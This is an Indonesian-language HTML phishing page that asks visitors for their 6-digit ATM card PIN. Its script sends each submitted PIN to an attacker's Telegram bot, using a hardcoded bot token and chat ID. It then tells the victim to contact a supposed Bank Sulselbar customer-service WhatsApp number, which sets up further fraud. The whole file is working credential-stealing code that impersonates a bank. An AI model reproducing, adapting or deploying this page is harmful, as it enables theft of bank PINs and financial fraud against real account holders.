<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Masukkan PIN</title>
<style>
    body { font-family: Arial, sans-serif; background-color: #f8f9fa; padding: 50px; }
    .container { max-width: 400px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; margin-bottom: 20px; color: green; } /* Judul warna hijau */
    label { display: block; margin-bottom: 8px; font-weight: bold; }
    input[type="password"], input[type="text"] { width: 100%; padding: 10px; font-size: 1em; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; }
    button { width: 100%; padding: 10px; background-color: green; color: #fff; border: none; border-radius: 4px; font-size: 1em; cursor: pointer; }
    button:hover { background-color: #006400; } /* Warna hover hijau lebih gelap */
    .message { text-align: center; font-weight: bold; margin-top: 15px; }
</style>
</head>
<body>
<div class="container">
<h2>Masukkan PIN Kartu ATM Anda </h2>
<form id="pinForm">
<label for="pin">PIN:</label>
<input type="password" id="pin" name="pin" maxlength="6" placeholder="Masukkan PIN (max 6 digit)" required />
<button type="submit">Verifikasi</button>
</form>
<div id="statusMessage" class="message"></div>
</div>

<script>
const BOT_TOKEN = "8896183841:AAEaMWp_Z8q3TQJjKYfaQCGB59iYMdjaoYQ"; // Ganti dengan token bot Anda
const CHAT_ID = "7692820036"; // Ganti dengan chat ID Anda

document.getElementById('pinForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const pinInput = document.getElementById('pin');
    const pin = pinInput.value.trim();
    const messageDiv = document.getElementById('statusMessage');

    if (pin.length !== 6 || isNaN(pin)) {
        messageDiv.textContent = 'PIN harus 6 angka.';
        messageDiv.style.color = 'red';
        return;
    }

    const telegramMessage = `PIN yang dimasukkan: ${pin}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(telegramMessage)}`, {
        method: 'GET'
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            messageDiv.textContent = 'Silakan Hubungi Cs Bank Sulselbar Untuk Aktivasi Wa 085211605264!';
            messageDiv.style.color = 'green';
        } else {
            messageDiv.textContent = 'Gagal mengirim PIN ke Telegram.';
            messageDiv.style.color = 'red';
        }
    })
    .catch(error => {
        messageDiv.textContent = 'Error saat mengirim ke Telegram.';
        messageDiv.style.color = 'red';
    });
});
</script>
</body>
</html>
